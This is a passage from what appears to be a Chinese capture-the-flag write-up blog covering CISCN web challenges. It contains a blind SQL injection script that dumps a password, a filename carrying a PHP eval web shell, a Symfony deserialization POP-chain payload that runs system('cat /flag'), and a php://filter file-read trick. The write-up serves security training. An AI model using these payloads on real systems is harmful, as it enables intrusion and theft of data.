class=\"string\">'select(group_concat(table_name))from(information_schema.tables)where(table_schema='</span>+db+<span class=\"string\">')'</span></span><br><span class=\"line\">    tables=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">(table)</span>:</span></span><br><span class=\"line\">    table = str2hex(table)</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(column_name))from(information_schema.columns)where(table_name='</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(columns,table)</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select(group_concat('</span>+columns+<span class=\"string\">'))from('</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    password=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_database() #ciscnfinal</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_tables('ciscnfinal') #images,users</span></span><br><span class=\"line\"></span><br><span class=\"line\">get_data(<span class=\"string\">'password'</span>,<span class=\"string\">'users'</span>) <span class=\"comment\">#1f97eef3ea37a28db040</span></span><br></pre></td></tr></table></figure>\n\n<p>其实直接猜表为users和栏password就好了   </p>\n<p>拿到密码然后登入，登入之后是一个文件上传，随便上传一个文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">I logged the file name you uploaded to logs&#x2F;upload.054981d8766f246f4da3af656bbf6fe9.log.php.</span><br></pre></td></tr></table></figure>\n\n<p>修改文件名为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;&lt;?&#x3D; eval($_POST[&#39;cmd&#39;]) ?&gt;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>短标签<? ?>需要php.ini开启short_open_tag = On，但<?= ?>不受该条控制。</p>\n<p>采用js写法的标记发现不起作用。</p>\n<p>菜刀连接，flag在根目录，打开即可</p>\n<p><img src=\"/pic/85.png\" alt=\"\"></p>\n<h2 id=\"总决赛-Day1-Web4-Laravel1\"><a href=\"#总决赛-Day1-Web4-Laravel1\" class=\"headerlink\" title=\"总决赛 Day1 Web4 Laravel1\"></a>总决赛 Day1 Web4 Laravel1</h2><p>打开题目，有一段代码，还给出了源码地址，下载整个源码，进行代码审计</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//backup in source.tar.gz</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Controllers</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Controller</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span><span class=\"params\">(\\Illuminate\\Http\\Request $request)</span></span>&#123;</span><br><span class=\"line\">        $payload=$request-&gt;input(<span class=\"string\">\"payload\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>($payload))&#123;</span><br><span class=\"line\">            highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            @unserialize($payload);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>直接给出了反序列化函数，接下来就是寻找POP链</p>\n<p>其中包含命名空间 <a href=\"https://www.runoob.com/php/php-namespace.html\" target=\"_blank\" rel=\"noopener\">关于命名空间</a></p>\n<p>先搜索__destruct，发现很多里面都是空的</p>\n<p><img src=\"/pic/86.png\" alt=\"\"></p>\n<p>后面在<code>vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php</code>找到一个</p>\n<p><img src=\"/pic/87.png\" alt=\"\"></p>\n<p>查看<code>invalidateTags</code>方法的定义</p>\n<p><img src=\"/pic/88.png\" alt=\"\"></p>\n<p>其中有一个<code>saveDeferred</code>，全局搜索看看，找到了<code>vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php</code></p>\n<p><img src=\"/pic/89.png\" alt=\"\"></p>\n<p>接着看<code>dosave</code>，就在当前页面的下面</p>\n<p><img src=\"/pic/90.png\" alt=\"\"></p>\n<p>此处存在动态调用可以调用到<code>system()</code></p>\n<p><img src=\"/pic/91.png\" alt=\"\"></p>\n<p><code>$this-&gt;setInnerItem</code>可控，<code>$innerItem</code>是我们传入的<code>$item</code>类中的<code>$innerItem</code>属性</p>\n<p>这里可以看到有 <strong>$item[“\\0*\\0expiry”]</strong>、<strong>$item[“\\0*\\0poolHash”]</strong> 这种写法，数组键名带有 <strong>\\0*\\0</strong> 。这实际上是类中，修饰符为 <strong>protected</strong> 的属性，在类强转成数组之后的结果</p>\n<p><img src=\"/pic/92.png\" alt=\"\"></p>\n<p>构造payload</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Symfony</span>\\<span class=\"title\">Component</span>\\<span class=\"title\">Cache</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CacheItem</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $innerItem = <span class=\"string\">'cat /flag'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Symfony</span>\\<span class=\"title\">Component</span>\\<span class=\"title\">Cache</span>\\<span class=\"title\">Adapter</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProxyAdapter</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $setInnerItem = <span class=\"string\">'system'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TagAwareAdapter</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> $deferred = [];</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">    \t<span class=\"keyword\">$this</span>-&gt;pool = <span class=\"keyword\">new</span> ProxyAdapter();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> TagAwareAdapter();</span><br><span class=\"line\">$a -&gt; deferred = <span class=\"keyword\">array</span>(<span class=\"string\">'a'</span> =&gt; <span class=\"keyword\">new</span> \\Symfony\\Component\\Cache\\CacheItem);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?payload&#x3D;O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A8%3A%22deferred%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A4%3A%22pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A1%3A%7Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3B%7D%7D</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pic/93.png\" alt=\"\"></p>\n<h2 id=\"华北赛区-Day1-Web5-CyberPunk\"><a href=\"#华北赛区-Day1-Web5-CyberPunk\" class=\"headerlink\" title=\"华北赛区 Day1 Web5 CyberPunk\"></a>华北赛区 Day1 Web5 CyberPunk</h2><p>是一个登入页面，查看网页源码，在最后发现了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--?file&#x3D;?--&gt;</span><br></pre></td></tr></table></figure>\n\n<p>可能是文件下载或者是文件包含</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload&#x3D;&#x2F;index.php?file&#x3D;index.php   返回数据为空</span><br></pre></td></tr></table></figure>\n\n<p>尝试使用伪协议</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload&#x3D;&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>\n\n<p>读取成功</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;index.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">ini_set(&#39;open_basedir&#39;, &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; $file &#x3D; $_GET[&quot;file&quot;];</span><br><span class=\"line\">$file &#x3D; (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);</span><br><span class=\"line\">if (isset($file))&#123;</span><br><span class=\"line\">    if (preg_match(&quot;&#x2F;phar|zip|bzip2|zlib|data|input|%00&#x2F;i&quot;,$file)) &#123;</span><br><span class=\"line\">        echo(&#39;no way!&#39;);</span><br><span class=\"line\">        exit;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @include($file);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;index&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class=\"line\">\t&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">        &lt;h2&gt;2077发售了,不来份实体典藏版吗?&lt;&#x2F;h2&gt;</span><br><span class=\"line\">        &lt;img class&#x3D;&quot;logo&quot; src&#x3D;&quot;.&#x2F;assets&#x2F;img&#x2F;logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;</span><br><span class=\"line\">        &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class=\"line\">                &lt;h3&gt;提交订单&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                &lt;form role&#x3D;&quot;form&quot; action&#x3D;&quot;.&#x2F;confirm.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;application&#x2F;x-www-urlencoded&quot;&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class=\"line\">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class=\"line\">                    &lt;h3&gt;地址:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;address&quot;&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;我正是送钱之人&lt;&#x2F;button&gt;</span><br><span class=\"line\">                &lt;&#x2F;form&gt;</span><br><span class=\"line\">            &lt;&#x2F;div&gt;</span><br><span class=\"line\">        &lt;&#x2F;div&gt;</span><br><span class=\"line\">    &lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class=\"line\">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">\t\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br><span class=\"line\">&lt;!--?file&#x3D;?--&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;search.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">require_once &quot;config.php&quot;; </span><br><span class=\"line\"></span><br><span class=\"line\">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $msg &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class=\"line\">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class=\"line\">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class=\"line\">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class=\"line\">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class=\"line\">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class=\"line\">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class=\"line\">        if(!$row) &#123;</span><br><span class=\"line\">            echo &#39;error&#39;;</span><br><span class=\"line\">            print_r($db-&gt;error);</span><br><span class=\"line\">            exit;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $msg &#x3D; &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg &#x3D; &quot;未找到订单!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else &#123;</span><br><span class=\"line\">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;搜索&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class=\"line\">\t&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class=\"line\">                &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">                &lt;h1&gt;订单查询&lt;&#x2F;h1&gt;</span><br><span class=\"line\">                &lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class=\"line\">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;查询订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                &lt;&#x2F;form&gt;</span><br><span class=\"line\">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class=\"line\">            &lt;&#x2F;div&gt;</span><br><span class=\"line\">        &lt;&#x2F;div&gt;</span><br><span class=\"line\">    &lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class=\"line\">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">            &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; 